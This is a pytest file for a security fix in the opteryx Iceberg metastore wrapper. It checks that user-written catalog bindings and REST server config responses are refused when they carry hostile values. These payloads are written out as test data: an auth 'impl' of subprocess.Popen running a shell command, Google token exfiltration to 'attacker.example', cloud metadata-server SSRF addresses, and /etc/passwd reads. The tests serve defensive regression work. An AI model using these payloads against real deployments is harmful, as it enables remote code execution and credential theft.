"""IcebergMetastore refuses catalog config outside its allow-list.

A workspace's catalog binding is written by its owner - any signed-up user - and
used to be forwarded to pyiceberg verbatim. pyiceberg imports and calls the class
an `auth.impl` names (code execution), and its Google auth manager sends the
process's own access token to whatever `uri` says. These tests pin both payloads
as refused, pin the documented bindings as accepted, and pin that a REST
catalog's SERVER cannot reintroduce either through its /v1/config response.
"""

import json
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler
from http.server import ThreadingHTTPServer
from unittest.mock import MagicMock
from unittest.mock import patch

sys.path.insert(0, os.path.join(sys.path[0], ".."))
sys.path.insert(1, os.path.join(sys.path[0], "../opteryx-catalog"))

import pytest

from opteryx_iceberg import IcebergMetastore
from opteryx_iceberg import UnrestrictedIcebergMetastore
from opteryx_iceberg.fileio import OpteryxFileIO
from opteryx_iceberg.metastore import _GuardedRestCatalog

GOOGLE_AUTH = {
    "type": "google",
    "google": {"scopes": ["https://www.googleapis.com/auth/cloud-platform"]},
}
BIGLAKE = "https://biglake.googleapis.com/iceberg/v1/restcatalog"

# The SEC-06 payloads, exactly as a draft connection test or a saved binding carries them.
RCE_BINDING = {
    "catalog_type": "rest",
    "uri": "https://example.com",
    "warehouse": "x",
    "auth": {
        "type": "custom",
        "impl": "subprocess.Popen",
        "custom": {"args": ["/bin/sh", "-c", "touch /tmp/pwned"]},
    },
}
TOKEN_EXFIL_BINDING = {
    "catalog_type": "rest",
    "uri": "https://attacker.example/",
    "warehouse": "w",
    "auth": {"type": "google"},
}


def _captured(**binding):
    """What IcebergMetastore hands pyiceberg's REST catalog, without a network."""
    construct = MagicMock()
    with patch("opteryx_iceberg.metastore._TenantRestCatalog", construct):
        IcebergMetastore(workspace="ws", **binding)
    (name,), properties = construct.call_args
    return name, properties


# ── the payloads ──────────────────────────────────────────────────────────────


def test_custom_auth_impl_is_refused_before_anything_is_imported_or_called():
    with (
        patch("subprocess.Popen") as popen,
        patch("pyiceberg.catalog.rest.auth.AuthManagerFactory.create") as factory,
        pytest.raises(ValueError, match="only supported auth"),
    ):
        IcebergMetastore(workspace="evil", **RCE_BINDING)
    popen.assert_not_called()
    factory.assert_not_called()


def test_google_auth_to_a_non_google_address_is_refused_before_a_token_is_fetched():
    with (
        patch("google.auth.default") as default,
        pytest.raises(ValueError, match="only sent to https://biglake.googleapis.com/"),
    ):
        IcebergMetastore(workspace="evil", **TOKEN_EXFIL_BINDING)
    default.assert_not_called()


@pytest.mark.parametrize(
    "uri",
    [
        "https://biglake.googleapis.com@attacker.example/",
        "https://biglake.googleapis.com.attacker.example/",
        "https://attacker.example/https://biglake.googleapis.com/",
        "http://biglake.googleapis.com/iceberg/v1/restcatalog",
    ],
)
def test_google_auth_host_lookalikes_are_refused(uri):
    with pytest.raises(ValueError):
        IcebergMetastore(workspace="evil", catalog_type="rest", uri=uri, auth=GOOGLE_AUTH)


@pytest.mark.parametrize(
    "auth",
    [
        {"type": "google", "google": {"credentials_path": "/etc/passwd"}},  # local file read
        {"type": "google", "impl": "subprocess.Popen"},
        {"type": "basic", "basic": {"username": "u", "password": "p"}},
        {"type": "noop"},
        {"type": "entra"},  # Azure ambient credentials
        {"type": "oauth2", "oauth2": {"token_url": "http://169.254.169.254/"}},
        {"google": {"scopes": []}},  # no type
        "google",
    ],
)
def test_other_auth_shapes_are_refused(auth):
    with pytest.raises(ValueError):
        IcebergMetastore(workspace="evil", catalog_type="rest", uri=BIGLAKE, auth=auth)


@pytest.mark.parametrize(
    "extra",
    [
        {"header.Metadata-Flavor": "Google"},  # metadata-server SSRF helper
        {"header.Authorization": "Bearer x"},
        {"py-io-impl": "subprocess.getoutput"},
        {"py-catalog-impl": "subprocess.Popen"},
        {"ssl": {"cabundle": "/etc/passwd"}},
        {"rest.sigv4-enabled": "true"},
        {"client.access-key-id": "x"},
        {"connect-timeout": 5},  # not a pyiceberg REST property: it would do nothing
        {"auth_type": "google"},  # retired flat spelling
        {"type": "rest"},
    ],
)
def test_keys_outside_the_allow_list_are_refused_not_dropped(extra):
    with pytest.raises(ValueError, match="not allowed"):
        IcebergMetastore(workspace="ws", catalog_type="rest", uri="https://c.example", **extra)


@pytest.mark.parametrize("catalog_type", ["sql", "hive", "glue", "in-memory", "REST"])
def test_only_rest_catalogs(catalog_type):
    # sql: a sqlite:/// uri creates and reads files on the host; hive/glue reach
    # services by address or with the process's ambient AWS identity.
    with pytest.raises(ValueError, match="only 'rest'"):
        IcebergMetastore(workspace="ws", catalog_type=catalog_type, uri="https://c.example")


@pytest.mark.parametrize(
    "binding",
    [
        {"uri": "http://169.254.169.254/computeMetadata/v1/"},
        {"uri": "http://catalog.example"},
        {"uri": "file:///etc/passwd"},
        {"uri": "https://"},
        {},
        {"uri": "https://c.example", "oauth2-server-uri": "http://10.0.0.5/token"},
    ],
)
def test_addresses_must_be_https(binding):
    with pytest.raises(ValueError):
        IcebergMetastore(workspace="ws", catalog_type="rest", **binding)


# ── the documented bindings still work ────────────────────────────────────────


def test_polaris_binding_with_a_stored_credential_reaches_pyiceberg_unchanged():
    # docs: "Connecting an Iceberg Catalog" - Example: Apache Polaris, stored
    # credential injected at `credential`.
    binding = {
        "catalog_type": "rest",
        "uri": "https://polaris.example.com/api/catalog",
        "oauth2-server-uri": "https://polaris.example.com/api/catalog/v1/oauth/tokens",
        "warehouse": "opteryx_fixture",
        "scope": "PRINCIPAL_ROLE:ALL",
        "header.X-Iceberg-Access-Delegation": "",
        "credential": "client-id:client-secret",
    }
    name, properties = _captured(**binding)
    assert name == "ws"
    expected = {k: v for k, v in binding.items() if k != "catalog_type"}
    assert properties == {"py-io-impl": "opteryx_iceberg.fileio.TenantFileIO", **expected}


def test_biglake_binding_with_ambient_google_auth_reaches_pyiceberg_unchanged():
    # docs: Example: Google BigLake.
    _, properties = _captured(
        catalog_type="rest",
        uri=BIGLAKE,
        warehouse="gs://bucket",
        auth=GOOGLE_AUTH,
        **{"header.x-goog-user-project": "project"},
    )
    assert properties["auth"] == GOOGLE_AUTH
    assert properties["header.x-goog-user-project"] == "project"


def test_bearer_token_binding_and_the_defaults():
    _, properties = _captured(uri="https://c.example/api", warehouse="w", token="tk")
    assert properties["token"] == "tk"


# ── the server cannot reconfigure the client ──────────────────────────────────


class _FakeRestCatalog:
    """A REST catalog on 127.0.0.1 answering /v1/config with `config` and listing one namespace."""

    def __init__(self, config: dict):
        payload = json.dumps(config).encode()

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/v1/config"):
                    body = payload
                elif self.path.startswith("/v1/p/namespaces"):
                    body = b'{"namespaces": [["ns"]]}'
                else:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.uri = f"http://127.0.0.1:{self.server.server_address[1]}"

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def served():
    servers = []

    def start(config):
        server = _FakeRestCatalog(config)
        servers.append(server)
        return server.uri

    yield start
    for server in servers:
        server.close()


# The plain http:// address needs the operator class; the server-side guard is the
# same _GuardedRestCatalog under both classes.


def test_an_ordinary_server_config_is_accepted(served):
    uri = served({"defaults": {"nessie.default-branch.name": "main"}, "overrides": {"prefix": "p"}})
    metastore = UnrestrictedIcebergMetastore(workspace="ws", uri=uri, warehouse="w")
    assert list(metastore.list_collections()) == ["ns"]


@pytest.mark.parametrize(
    "served_config",
    [
        {"overrides": {"auth": RCE_BINDING["auth"]}},
        {"defaults": {"auth": RCE_BINDING["auth"]}},
        {"overrides": {"auth": {"type": "google"}}},
        {"overrides": {"uri": "http://169.254.169.254/computeMetadata/v1"}},
        {"overrides": {"header.Metadata-Flavor": "Google"}},
        {"overrides": {"py-io-impl": "subprocess.getoutput"}},
        {"overrides": {"oauth2-server-uri": "http://169.254.169.254/"}},
        {"overrides": {"ssl": {"cabundle": "/etc/passwd"}}},
    ],
)
def test_a_server_cannot_set_transport_auth_or_code_properties(served, served_config):
    uri = served(served_config)
    with (
        patch("subprocess.Popen") as popen,
        patch("google.auth.default") as default,
        pytest.raises(ValueError, match="tried to set"),
    ):
        UnrestrictedIcebergMetastore(workspace="ws", uri=uri, warehouse="w")
    popen.assert_not_called()
    default.assert_not_called()


def test_a_served_or_table_property_py_io_impl_never_names_the_table_fileio(served):
    """A table's FileIO is built from its metadata properties and the load-table
    `config`, both written by the catalog's owner; pyiceberg would import and call
    whatever `py-io-impl` they name (here subprocess.getoutput, i.e. a shell)."""
    uri = served({"overrides": {"prefix": "p"}})
    catalog = _GuardedRestCatalog(
        "ws", uri=uri, warehouse="w", **{"py-io-impl": "opteryx_iceberg.fileio.OpteryxFileIO"}
    )
    with patch("subprocess.getoutput") as getoutput:
        io = catalog._load_file_io({"py-io-impl": "subprocess.getoutput"}, "s3://b/m.json")
    getoutput.assert_not_called()
    assert type(io) is OpteryxFileIO


# ── carried over from the pass-through era ────────────────────────────────────


def test_retired_flat_auth_kwargs_raise_on_the_operator_class():
    with pytest.raises(ValueError, match="auth_type.*retired"):
        UnrestrictedIcebergMetastore(workspace="x", auth_type="google")
    with pytest.raises(ValueError, match="google_auth_scopes.*retired"):
        UnrestrictedIcebergMetastore(workspace="x", google_auth_scopes=("s",))


def test_a_callers_py_io_impl_is_refused_on_the_operator_class():
    """Manifests are always read through OpteryxFileIO (see load_dataset), so
    a caller's `py-io-impl` could only be silently ignored - it is refused."""
    with pytest.raises(ValueError, match="py-io-impl.*not configurable"):
        UnrestrictedIcebergMetastore(
            workspace="x", **{"py-io-impl": "pyiceberg.io.fsspec.FsspecFileIO"}
        )
